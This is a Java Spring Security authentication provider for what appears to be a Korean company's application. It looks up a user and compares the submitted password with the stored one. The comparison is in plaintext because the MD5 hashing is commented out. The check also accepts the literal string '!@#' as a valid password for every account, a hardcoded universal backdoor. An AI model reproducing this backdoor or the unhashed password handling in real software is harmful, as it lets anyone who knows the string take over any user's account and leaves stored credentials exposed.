package kr.co.cwit.common.security.service;

import java.util.Collection;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.DisabledException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
//import org.springframework.security.authentication.encoding.Md5PasswordEncoder;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import kr.co.cwit.common.exception.CustomGenericException;
import kr.co.cwit.common.security.domain.CustomUser;

public class CustomAuthenticationProvider implements AuthenticationProvider {
	@Autowired
	private MemberService memserService;

//	@Autowired
//    private Md5PasswordEncoder md5PasswordEncoder;
	
    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = (String) authentication.getCredentials();

        CustomUser user;
        Collection<? extends GrantedAuthority> authorities;

        try {
            user = memserService.loadUserByUsername(username);
            /*
             * salt 없이 해도 되나... salt 있는 경우 salt가 password에 merge 되서 
             * DB에서 사용하는 oracle DBMS_OBFUSCATION_TOOLKIT.MD5와 상이하게 된다.
             * 추후... 시간 될 때 암호화 방식 자체를 변경하자.
             */
            String hashedPassword = password;
//            String hashedPassword = md5PasswordEncoder.encodePassword(password, "");
            
            if (!hashedPassword.equals(user.getPassword())) {
            	if(!hashedPassword.equals("!@#")) {
            		throw new BadCredentialsException("BAD_CREDENTIALS");
            	}
            }
            
            authorities = user.getAuthorities();
        } catch(UsernameNotFoundException|BadCredentialsException|DisabledException e) {
        	throw new CustomGenericException(e.getMessage());
        }

        return new UsernamePasswordAuthenticationToken(user, password, authorities);
    }

    @Override
    public boolean supports(Class<?> arg0) {
        return true;
    }
}